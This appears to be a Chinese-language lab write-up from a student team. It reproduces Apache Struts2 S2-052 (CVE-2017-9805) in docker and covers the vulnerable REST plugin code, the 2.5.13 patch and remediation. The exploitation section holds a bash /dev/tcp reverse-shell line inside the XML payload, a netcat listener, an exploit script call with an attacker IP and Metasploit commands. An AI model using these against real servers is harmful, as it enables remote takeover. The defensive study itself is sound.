# Apache Struts2 S2-052(CVE-2017-9805)远程代码执行漏洞

## 0x00 漏洞描述

`Apache Struts`是美国阿帕奇（Apache）软件基金会负责维护的一个开源项目，是一套用于创建企业级`Java Web`应用的开源MVC框架。

`Struts2`是一个基于MVC设计模式的Web应用框架，它本质上相当于一个servlet，在MVC设计模式中，`Struts2`作为控制器(Controller)来建立模型与视图的数据交互

2017年9月5日，Apache Struts发布最新安全公告，Apache Struts2的`REST`插件存在远程代码执行的高危漏洞，该漏洞由lgtm.com的安全研究员汇报，漏洞编号为CVE-2017-9805（S2-052）。

Github项目地址: [Vancir/s2-052-reproducing](https://github.com/Vancir/s2-052-reproducing)

## 0x01 漏洞影响

启用Struts REST插件并使用XStream组件对XML进行反序列操作时，未对数据内容进行有效验证，可被攻击者进行远程代码执行攻击(RCE)。

实际场景中存在一定局限性，需要满足一定条件(如要求jdk版本较新)，非struts本身默认开启的组件。

### 影响版本

* Version 2.5.0 to 2.5.12
* Version 2.1.2 to 2.3.33

## 0x02 环境搭建

* Ubuntu 14.04.5
* JDK 8u151
* Struts 2.5.12
* Apache Tomcat 8.0.46

通过建立docker容器来搭建实验环境，保证复现过程的安全性和便
携性。在docker环境中部署好Apache Tomcat，Struts 2以及Java等基础环境。

* 运行以下命令拉取docker镜像

``` bash
sudo -s # docker 需要以root身份运行
docker pull vancir/s2-052:2.5.12 # 从docker cloud上拉取仓库vancir/s2-052(struts2版本为2.5.12)到本地
```

* 或使用dockerfile手动生成docker镜像

由于`JDK 8u151`文件较大，因此首先需要使用者从[Oracle官网](http://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html)下载并移动到`src`文件夹下(md5sum: `774d8cb584d9ebedef8eba9ee2dfe113`  jdk-8u151-linux-x64.tar.gz)。

然后切换到dockerfile文件所在路径，运行以下命令

``` bash
docker build -t="vancir/s2-052:2.5.12" .
```

* 创建并运行docker容器

``` bash
docker run --name demo -d -p 80:8080 vancir/s2-052:2.5.12 
```

`--name`选项设置docker容器的名称为demo，`-d`选项设置容器在后台运行，`-p`选项设置容器内8080端口映射为本地的80端口，`vancir/s2-052:2.5.12`是我们的docker镜像

docker容器运行完成后，访问`http://localhost`观察到如下页面，即完成实验环境的搭建步骤。

![tomcat.png](/src/tomcat.png)

## 0x03 漏洞攻击复现

### 使用burpsuite直接发送恶意xml

接下来我们就要使用burpsuite发送恶意xml给服务器并反弹一个shell。

首先打开`burp suite`(需到[官网](https://portswigger.net/burp/freedownload)下载安装)，切换到`Repeater`选项卡

将`payload.xml`里的内容全部复制粘贴到`Request`内容框中，并设置右上角的`Target`为`127.0.0.1:80`

这里需要对`payload.xml`的以下内容进行改动，以保证服务器反弹的shell能被我们接收到。

``` xml
<string>bash -i &gt;&amp; /dev/tcp/10.30.178.227/8001 0&gt;&amp;1</string>
```

这条命令为我们反弹一个shell回来。你需要将`10.30.178.227`设置为你本机的IP，`8001`是反弹到你本机的端口号

![burp.png](/src/burp.png)

打开终端，使用`NetCat`监听本地端口`8001`

``` bash
nc -l -p 8001
```

现在`NetCat`正在监听本机的8001端口，我们点击`burp suite`左上方的`Go`按钮提交request，服务器会返回一个responce，同时我们也监听到了一个shell

![nc.png](/src/nc.png)

如图，我们获取了一个root身份的shell，通过shell我们可以执行任意指令(如图`cat /etc/passwd`). 至此漏洞攻击复现完毕。

### 运行python脚本实现攻击

编写好了一个[python脚本](./exploit.py)以供更便捷地复现攻击过程

``` bash
nc -l -p 8001
# Use: python exploit.py <attacker ip> <attacker port>
python exploit.py 10.30.178.227 8001
```

### 使用Metasploit模块进行攻击

``` bash
msf > use exploit/multi/http/struts2_rest_xstream
msf exploit(struts2_rest_xstream) > show targets
    ...targets...
msf exploit(struts2_rest_xstream) > set TARGET <target-id>
msf exploit(struts2_rest_xstream) > show options
    ...show and set options...
msf exploit(struts2_rest_xstream) > exploit
```

> Todo: Wireshark观察攻击过程

## 0x04 漏洞分析

从`Apache Struts`的一个镜像站点下载`Apache Struts 2.5.12`的源码包进行分析: [struts-2.5.12-src.zip](https://archive.apache.org/dist/struts/2.5.12/struts-2.5.12-src.zip)

在`struts-plugins.xml`中的`bean`标签根据`Content-Type`进行分类，并对各类唯一指定了一个`Handler`.

``` xml
<!-- filepath: /src/plugins/rest/src/main/resources/struts-plugin.xml -->
<bean type="org.apache.struts2.rest.handler.ContentTypeHandler" name="xml" class="org.apache.struts2.rest.handler.XStreamHandler" />
```

`ContentTypeHandler`将对应类型的请求数据分配给指定的子类进行处理，针对`xml`则是默认指定用`XStreamHandler`进行处理，这意味着使用REST插件就会存在`XStreamHandler`的反序列化漏洞。我们查看源码分析它是如何进行处理的

``` java
// filepath: src/plugins/rest/src/main/java/org/apache/struts2/rest/handler/XStreamHandler.java

public class XStreamHandler implements ContentTypeHandler {

    public String fromObject(Object obj, String resultCode, Writer out) throws IOException {
        if (obj != null) {
            XStream xstream = createXStream();
            xstream.toXML(obj, out);
        }
        return null;
    }

    public void toObject(Reader in, Object target) {
        XStream xstream = createXStream();
        xstream.fromXML(in, target);
    }
    
    protected XStream createXStream() {
        return new XStream();
    }

    public String getContentType() {
        return "application/xml";
    }

    public String getExtension() {
        return "xml";
    }
}
```

可见，在`marshal`和`unmarshal`过程中，`XStreamHandler`未能对请求的XML数据进行校验和检查，可能导致Java反序列化漏洞

再看`ContentTypeInterceptor.java`，代码首先使用`getHandlerForRequest`方法(Gets the handler for the request by looking at the request content type and extension)对请求的xml获取`XStreamHandler`

``` java
// filepath: src/plugins/rest/src/main/java/org/apache/struts2/rest/ContentTypeInterceptor.java
public String intercept(ActionInvocation invocation) throws Exception {
    HttpServletRequest request = ServletActionContext.getRequest();
    ContentTypeHandler handler = selector.getHandlerForRequest(request);
    
    Object target = invocation.getAction();
    if (target instanceof ModelDriven) {
        target = ((ModelDriven)target).getModel();
    }
    
    if (request.getContentLength() > 0) {
        InputStream is = request.getInputStream();
        InputStreamReader reader = new InputStreamReader(is);
        handler.toObject(reader, target);
    }
    return invocation.invoke();
}
```

其中的关键漏洞代码在以下：
``` java
InputStream is = request.getInputStream();
InputStreamReader reader = new InputStreamReader(is);
handler.toObject(reader, target);
```

这里未有对请求数据进行校验和检查，导致了`XStreamHandler`在反序列化传入的xml时造成了远程代码执行。

至于如何构造XML数据导致命令执行，详情查看这篇论文: [marshalsec.pdf](https://github.com/mbechler/marshalsec/blob/master/marshalsec.pdf)

我们可以使用论文作者开源的`marshalsec`工具来生成payload。

## 0x05 补丁分析

从`Apache Struts`的一个镜像站点下载`Apache Struts 2.5.13`的源码包进行分析: [struts-2.5.13-src.zip](https://archive.apache.org/dist/struts/2.5.13/struts-2.5.13-src.zip),同时结合官方发布补丁的commit记录进行分析： [链接](https://github.com/apache/struts/commit/19494718865f2fb7da5ea363de3822f87fbda264)


我们可以观察到,在新发布的版本2.5.13中`org.apache.struts2.rest.handler`这个包新增了几个文件: `AllowedClassNames.java`, `AllowedClasses.java`， `AbstractContentTypeHandler.java`和`XStreamPermissionProvider.java`


在`XStreamHandler`类中修改了`createXStream`方法同时新加了几个方法.

``` java
protected XStream createXStream(ActionInvocation invocation) {
    XStream stream = new XStream();
    LOG.debug("Clears existing permissions");
    stream.addPermission(NoTypePermission.NONE);

    LOG.debug("Adds per action permissions");
    addPerActionPermission(invocation, stream);

    LOG.debug("Adds default permissions");
    addDefaultPermissions(invocation, stream);
    return stream;
}
```

新添代码的主要作用是将`xml`中的数据白名单化，把`Collection`和`Map`，一些基础类，时间类放在白名单中，这样就能阻止`XStream`反序列化的过程中带入一些有害类。

``` java
private void addPerActionPermission(ActionInvocation invocation, XStream stream) {
    Object action = invocation.getAction();
    if (action instanceof AllowedClasses) {
        Set<Class<?>> allowedClasses = ((AllowedClasses) action).allowedClasses();
        stream.addPermission(new ExplicitTypePermission(allowedClasses.toArray(new Class[allowedClasses.size()])));
    }
    if (action instanceof AllowedClassNames) {
        Set<String> allowedClassNames = ((AllowedClassNames) action).allowedClassNames();
        stream.addPermission(new ExplicitTypePermission(allowedClassNames.toArray(new String[allowedClassNames.size()])));
    }
    if (action instanceof XStreamPermissionProvider) {
        Collection<TypePermission> permissions = ((XStreamPermissionProvider) action).getTypePermissions();
        for (TypePermission permission : permissions) {
            stream.addPermission(permission);
        }
    }
}

protected void addDefaultPermissions(ActionInvocation invocation, XStream stream) {
    stream.addPermission(new ExplicitTypePermission(new Class[]{invocation.getAction().getClass()}));
    if (invocation.getAction() instanceof ModelDriven) {
        stream.addPermission(new ExplicitTypePermission(new Class[]{((ModelDriven) invocation.getAction()).getModel().getClass()}));
    }
    stream.addPermission(NullPermission.NULL);
    stream.addPermission(PrimitiveTypePermission.PRIMITIVES);
    stream.addPermission(ArrayTypePermission.ARRAYS);
    stream.addPermission(CollectionTypePermission.COLLECTIONS);
    stream.addPermission(new ExplicitTypePermission(new Class[]{Date.class}));
}
```

另外，针对官方给出的临时缓解措施 `<constant name="struts.action.extension" value="xhtml,,json" />` 这是针对action的后缀进行限定，而是否使用`XStream`进行处理则取决于`Content-Type`是否含有`xml`。如果`Content-Type`中含有`xml`，则依旧会交给`XStream`处理。因此该临时缓解措施完全无效。

针对补丁后的版本，漏洞的防御过程实验。可以拉取docker仓库中的`vancir/s2-052:2.5.13`并依照之前的步骤重新操作

``` bash
sudo -s
docker pull vancir/s2-052:2.5.13
```

## 0x06 Struts 2过往漏洞情况

Apache Struts 2漏洞频发，过往有大量的该产品的漏洞预警。安全分析人士甚至编写有Struts2全漏洞检测脚本。通过对往期Struts2漏洞，分析Struts2常见的攻击方式并总结Struts2的一些修复建议。

> Todo: 搜集过往的一些漏洞情况

## 0x07 S2-052 修复建议

在新版本中增加了`XStreamPermissionProvider`，并且对原先有问题的`createXStream`进行重写，增加了校验，拒绝不安全的类执行

* 升级至`Struts 2.5.13`或`Struts 2.3.34`版本
* 在不使用时移除移除`Struts REST`插件


## 0xEE 人员分工

* 组长-陈洪杰：负责项目进度监督，任务调整以及漏洞的深入分析
* 刘松：负责搭建漏洞复现环境，并对漏洞代码以及补丁进行分析
* 林颖萱：负责收集过往Struts2的漏洞分析文章，利用代码及防御策略等
* 李金航：负责收集s2-052漏洞的技术分析文章，利用代码及防御策略等

## 0xFF 参考资料
1. [Using QL to find a remote code execution vulnerability in Apache Struts (CVE-2017-9805)](https://lgtm.com/blog/apache_struts_CVE-2017-9805)

2. [Apache Struts 2 Documentation - Security Bulletins - S2-052](https://cwiki.apache.org/confluence/display/WW/S2-052)

3. [Metasploit Modules Related To CVE-2017-9805](https://www.rapid7.com/db/modules/exploit/multi/http/struts2_rest_xstream)

4. [Oracle Security Alert Advisory - CVE-2017-9805](http://www.oracle.com/technetwork/security-advisory/alert-cve-2017-9805-3889403.html)
 